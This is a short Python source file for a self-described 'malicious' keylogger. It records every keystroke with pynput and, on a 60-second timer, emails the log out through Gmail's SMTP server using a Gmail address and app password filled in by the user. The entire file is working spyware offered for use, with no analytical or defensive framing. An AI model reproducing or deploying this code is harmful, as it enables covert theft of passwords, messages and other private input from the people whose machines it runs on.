import smtplib
import threading
from pynput import keyboard

class KeyLogger:
    def __init__(self, time_interval: int, email: str, app_password: str):
        self.interval = time_interval
        self.log = "KeyLogger has started..."
        self.email = email  # Your Gmail address
        self.app_password = app_password  # Your App Password

    def append_to_log(self, string):
        assert isinstance(string, str)
        self.log = self.log + string

    def on_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.esc:
                print("Exiting program...")
                return False
            else:
                current_key = " " + str(key) + " "

        self.append_to_log(current_key)

    def send_mail(self, email, app_password, message):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, app_password)
        server.sendmail(email, email, message)
        server.quit()

    def report_n_send(self):
        send_off = self.send_mail(self.email, self.app_password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report_n_send)
        timer.start()

    def start(self):
        keyboard_listener = keyboard.Listener(on_press=self.on_press)
        with keyboard_listener:
            self.report_n_send()
            keyboard_listener.join()

if __name__ == "__main__":
    # Use your Gmail address and the generated App Password
    email = 'Your E-mail'
    app_password = 'Your App Password' # 16 digit app password

    malicious_keylogger = KeyLogger(60, email, app_password)
    malicious_keylogger.start()
